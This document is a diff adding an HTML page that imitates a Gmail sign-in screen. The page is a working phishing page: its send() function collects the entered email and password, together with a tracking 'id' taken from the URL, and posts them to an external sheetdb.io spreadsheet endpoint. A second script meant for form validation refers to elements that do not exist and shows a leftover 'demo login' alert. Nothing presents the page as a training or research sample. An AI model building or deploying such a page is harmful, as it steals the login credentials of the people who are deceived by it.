@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Mail Login</title>
+
+  <style>
+    :root {
+      --primary: #1a73e8;
+      --text: #202124;
+      --muted: #5f6368;
+      --radius: 8px;
+    }
+
+    body {
+      margin: 0;
+      background: #f1f3f4;
+      font-family: system-ui, Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      color: var(--text);
+    }
+
+    .card {
+      background: #fff;
+      padding: 32px;
+      width: 100%;
+      max-width: 360px;
+      border-radius: 12px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+
+    .logo-placeholder {
+      width: 48px;
+      height: 48px;
+      background: #e8f0fe;
+      border-radius: 8px;
+      display: grid;
+      place-items: center;
+      margin: 0 auto 16px;
+      border: 1px solid rgba(0,0,0,0.1);
+    }
+
+    h1 {
+      font-size: 22px;
+      margin: 0 0 6px;
+      font-weight: 500;
+    }
+
+    .subtitle {
+      color: var(--muted);
+      font-size: 14px;
+      margin-bottom: 24px;
+    }
+
+    .input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #dadce0;
+      border-radius: var(--radius);
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+      outline: none;
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: var(--primary);
+      border: none;
+      border-radius: var(--radius);
+      color: #fff;
+      font-size: 15px;
+      font-weight: 500;
+      cursor: pointer;
+      margin-top: 12px;
+    }
+
+    .btn:active {
+      transform: translateY(1px);
+    }
+
+    .link-row {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 10px;
+    }
+
+    .link {
+      font-size: 14px;
+      color: var(--primary);
+      text-decoration: none;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: var(--muted);
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: -15px;
+      margin-bottom: 10px;
+      display: none;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="card">
+    
+    
+      <!-- generic icon -->
+      <h1>Gmail</h1>
+  
+
+    <h5>Sign in</h5>
+    <div class="subtitle">Use your email account</div>
+
+    
+      <input type="email" id="email" class="input" placeholder="Email" required>
+      <div id="emailErr" class="error">Invalid email address.</div>
+
+      <input type="password" id="password" class="input" placeholder="Password" required minlength="4">
+      <div id="passErr" class="error">Password is too short.</div>
+
+      <div class="link-row">
+        <a href="#" class="link">Forgot email?</a>
+        <a href="#" class="link">Forgot password?</a>
+      </div>
+
+      <button onclick="send()" class="btn" type="submit">Next</button>
+   
+
+
+
+
+        <script>
+        function send() {
+           const email = document.getElementById('email').value;
+       const password = document.getElementById('password').value;
+           
+           
+        var urldata = new URLSearchParams(window.location.search);
+        
+        const id = urldata.get('id');
+        const type = "gmail";
+        
+           
+           const url = "https://sheetdb.io/api/v1/md4crj2w1sk6g";
+
+fetch(url, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    data: {
+      id: id,
+      type: type,
+      username: email,
+      password: password
+    }
+  })
+})
+.then(response => response.json())
+.then(result => {
+  //out
+})
+.catch(error => {
+  window.alert(error);
+});
+            
+            
+        }
+            
+        </script>
+        
+        
+
+
+
+
+
+
+
+
+
+    <div class="footer">English (US)</div>
+  </div>
+
+  <script>
+    const form = document.getElementById('mailForm');
+    const email = document.getElementById('email');
+    const pass = document.getElementById('pass');
+
+    const emailErr = document.getElementById('emailErr');
+    const passErr = document.getElementById('passErr');
+
+    form.addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      let valid = true;
+      emailErr.style.display = 'none';
+      passErr.style.display = 'none';
+
+      if (!email.value.includes('@')) {
+        emailErr.style.display = 'block';
+        valid = false;
+      }
+      if (pass.value.length < 4) {
+        passErr.style.display = 'block';
+        valid = false;
+      }
+
+      if (!valid) return;
+
+      alert("Demo login successful.\nUse this to connect to your backend API.");
+    });
+  </script>
+</body>
+</html>
